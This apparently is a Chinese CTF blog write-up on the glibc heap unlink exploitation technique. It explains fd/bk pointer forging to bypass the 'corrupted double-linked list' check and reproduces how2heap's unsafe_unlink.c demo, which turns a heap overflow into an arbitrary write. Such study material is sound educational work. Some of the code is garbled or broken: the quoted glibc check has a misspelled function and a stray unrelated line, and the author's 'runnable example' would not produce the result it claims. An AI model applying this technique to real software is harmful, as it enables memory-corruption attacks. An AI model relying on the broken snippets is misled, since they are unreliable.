---
title: unlink
published: 2026-04-19
description: "unlink"
tags: ["ctfwp", "heap"]
category: ctf
draft: false
---
## 什么是 unlink

* **Glibc** 会倾向于把两个不需要的内存空间合并，来避免碎片化内存
* **Unlink** 操作则是把连个物理相邻的堆块合并，变成一个新的。

:::note
所以在**heap**中申请较小的堆块可以 在一定程度上防止被**Bin**中**topchunk**合并
:::

一般来说其中的操作一般为这个流程

```txt
FD = P -> fd
BK = P -> bk
FD -> bk = BK
BK -> fd = FD
```

### 利用方式

+ 前提：存在**UAF**漏洞
+ 受限使用 Use After-Free修改的堆块(P)的fd指针指向需要修改成\(*内存地址-12*\), 将bk指针修改成需要修稿的内容，进行**Unlink**操作,

> `FD = p -> fd`, FD 变成了我们篡改的\(*内存地址 - 12*\)
> `BK = p -> bk`, BK 变成我们篡改的内容 \(*需要修改的内容*\)
> `FD -> bk = BK`, FD\(*内存地址 - 12*\) 的fd 也就是内存地址-12的+12变成了BK \(*需要修改的内容*\)

### 新版glibc 添加的防御机制

```c
if (__builtin_expect(FD -> bk != P || BK -> fd != P, 0)) 
  malloc_printrtt (check_action, "corrupted double-linked list", P, AV);
  rn_go(f, seed, [])
}
```

这里导致了原来的方法(32位)

* `FD -> bk = target_addr - 12 + 12 = target_addr`
* `BK -> fd = expect_value + 8`

1. 首先我们通过覆盖，将**nextchunk**的 `FD`执政指向了 `fakeFD`，将**nextchunk**的BK指针指向了 `fakeBK`,
2. 那么为了通过验证，我们需要 `fakeFD -> bk == P <=> *(fakeBK + 12) == P fakeBK -> fd == *(fakeBK + 8) == P`
3. 当满足上述操作，可以进入 Unlink 环节，进行如下操作

+ `fakeFD -> bk = fakeBK <=> *(fakeFD + 12) = fakeBK`
+ `fakeBK -> fd = fakeFD <=> *(fakeBK + 8) = fakeFD`
+ 如果让 `fakeFD + 12` 和 `fakeBK + 8` 指向同一个指向P的指针，那么 `*P =  P - 8`

这是其中的一个可运行示例

```c
#include <stdio.h>
#include <stdlib.h>
#include <string.h>

int main() {
  // 1. 分配两个 chunk
  unsigned long long *chunk0 = malloc(0x80);
  unsigned long long *chunk1 = malloc(0x80);
  printf("chunk0 = %p\n", chunk0);
  printf("chunk1 = %p\n", chunk1);
  // 2. 释放 chunk0 并伪造 fd/bk
  
  free(chunk0);
  // 假设存在 UAF，可以修改 chunk0 的 fd/bk
  // 这里我们模拟 UAF，直接写已释放的内存
  
  unsigned long long *ptr = chunk0; // 指向 chunk0 的指针
  // 64位：FD = ptr - 0x18, BK = ptr - 0x10
  chunk0[0] = (unsigned long long)(ptr - 0x18); // fd
  chunk0[1] = (unsigned long long)(ptr - 0x10); // bk
  
  // 3. 触发 unlink（释放相邻的 chunk1）
  free(chunk1);
  // 4. 验证 ptr 是否被修改
  printf("ptr now points to: %p\n", ptr);
  // 预期输出：ptr = chunk0 - 0x18
  return 0;
}
// gcc -g -no-pie -fno-stack-protector -o unsafe_unlink unsafe_unlink.c
```

### 例题 [unsafe_unlink.c](https://github.com/shellphish/how2heap/blob/master/glibc_2.31/unsafe_unlink.c)

```c
#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <stdint.h>
#include <assert.h>

uint64_t *chunk0_ptr;

int main()
{
	setbuf(stdout, NULL);
	printf("Welcome to unsafe unlink 2.0!\n");
	printf("Tested in Ubuntu 20.04 64bit.\n");
	printf("This technique can be used when you have a pointer at a known location to a region you can call unlink on.\n");
	printf("The most common scenario is a vulnerable buffer that can be overflown and has a global pointer.\n");

	int malloc_size = 0x420; //we want to be big enough not to use tcache or fastbin
	int header_size = 2;

	printf("The point of this exercise is to use free to corrupt the global chunk0_ptr to achieve arbitrary memory write.\n\n");

	chunk0_ptr = (uint64_t*) malloc(malloc_size); //chunk0
	uint64_t *chunk1_ptr  = (uint64_t*) malloc(malloc_size); //chunk1
	printf("The global chunk0_ptr is at %p, pointing to %p\n", &chunk0_ptr, chunk0_ptr);
	printf("The victim chunk we are going to corrupt is at %p\n\n", chunk1_ptr);

	printf("We create a fake chunk inside chunk0.\n");
	printf("We setup the size of our fake chunk so that we can bypass the check introduced in https://sourceware.org/git/?p=glibc.git;a=commitdiff;h=d6db68e66dff25d12c3bc5641b60cbd7fb6ab44f\n");
	chunk0_ptr[1] = chunk0_ptr[-1] - 0x10;
	printf("We setup the 'next_free_chunk' (fd) of our fake chunk to point near to &chunk0_ptr so that P->fd->bk = P.\n");
	chunk0_ptr[2] = (uint64_t) &chunk0_ptr-(sizeof(uint64_t)*3);
	printf("We setup the 'previous_free_chunk' (bk) of our fake chunk to point near to &chunk0_ptr so that P->bk->fd = P.\n");
	printf("With this setup we can pass this check: (P->fd->bk != P || P->bk->fd != P) == False\n");
	chunk0_ptr[3] = (uint64_t) &chunk0_ptr-(sizeof(uint64_t)*2);
	printf("Fake chunk fd: %p\n",(void*) chunk0_ptr[2]);
	printf("Fake chunk bk: %p\n\n",(void*) chunk0_ptr[3]);

	printf("We assume that we have an overflow in chunk0 so that we can freely change chunk1 metadata.\n");
	uint64_t *chunk1_hdr = chunk1_ptr - header_size;
	printf("We shrink the size of chunk0 (saved as 'previous_size' in chunk1) so that free will think that chunk0 starts where we placed our fake chunk.\n");
	printf("It's important that our fake chunk begins exactly where the known pointer points and that we shrink the chunk accordingly\n");
	chunk1_hdr[0] = malloc_size;
	printf("If we had 'normally' freed chunk0, chunk1.previous_size would have been 0x430, however this is its new value: %p\n",(void*)chunk1_hdr[0]);
	printf("We mark our fake chunk as free by setting 'previous_in_use' of chunk1 as False.\n\n");
	chunk1_hdr[1] &= ~1;

	printf("Now we free chunk1 so that consolidate backward will unlink our fake chunk, overwriting chunk0_ptr.\n");
	printf("You can find the source of the unlink_chunk function at https://sourceware.org/git/?p=glibc.git;a=commitdiff;h=1ecba1fafc160ca70f81211b23f688df8676e612\n\n");
	free(chunk1_ptr);

	printf("At this point we can use chunk0_ptr to overwrite itself to point to an arbitrary location.\n");
	char victim_string[8];
	strcpy(victim_string,"Hello!~");
	chunk0_ptr[3] = (uint64_t) victim_string;

	printf("chunk0_ptr is now pointing where we want, we use it to overwrite our victim string.\n");
	printf("Original value: %s\n",victim_string);
	chunk0_ptr[0] = 0x4141414142424242LL;
	printf("New Value: %s\n",victim_string);

	// sanity check
	assert(*(long *)victim_string == 0x4141414142424242L);
}
```

:::note

> 设指向可 UAF 的 chunk 的指针的地址为 `ptr`
> **32位**：
>
> - 修改 `fd` 为 `ptr - 0xC`
> - 修改 `bk` 为 `ptr - 0x8`
> - 触发 unlink 后 `ptr` 处的指针会变成 `ptr - 0x8`
>   **64位**：
> - 修改 `fd` 为 `ptr - 0x18`
> - 修改 `bk` 为 `ptr - 0x10`
> - 触发 unlink 后 `ptr` 处的指针会变成 `ptr - 0x10`

:::

## 常见堆块的结构

glibc 的源代码中， `malloc_chunk` 的结构定义如下，无论是哪种Bin，空闲chunk 都用这个结构表示
```c
struct malloc_chunk {
    size_t mchunk_prev_size;
    size_t mchunk_size;
    struct malloc_chunk* fd;   // 前向指针，指向同 bin 中的下一个空闲块
    struct malloc_chunk* bk;   // 后向指针，指向上一个空闲块
    // 后面可能还有 fd_nextsize, bk_nextsize（仅 large bin 使用）
};
```

| 字段                 | 说明                                                                                                                                                                                                                               |
| -------------------- | ---------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------- |
| **prev_size**  | 8 字节。如果前一个物理相邻的堆块是**空闲的** ，则该字段记录前一个块的大小；否则被前一个块的数据复用（用于存放用户数据）。                                                                                                    |
| **size**       | 8 字节。记录当前块的总大小（包括头部和用户数据），按 8 或 16 字节对齐。低 3 位是标志位：``-`A`(bit 2)：非主分配区标志``-`M`(bit 1)：通过 mmap 分配``-`P`(bit 0)：前一个块是否在使用中（1=在用，0=空闲） |
| **用户数据区** | 从 `size`字段之后开始，返回给用户使用的内存区域。                                                                                                                                                                                |

> 已分配块不维护 `fd` 和 `bk` 指针，这部分空间完全被用户数据占用，以提高内存利用率。

```text
地址低位
+-------------------+   <--- chunk 起始指针
| prev_size         |   } 固定头部 (16 字节)
+-------------------+
| size (含标志位)   |
+-------------------+   <--- 用户数据区起始
|                   |
|   用户数据 /       |
|   空闲时: fd, bk  |
|                   |
+-------------------+
```
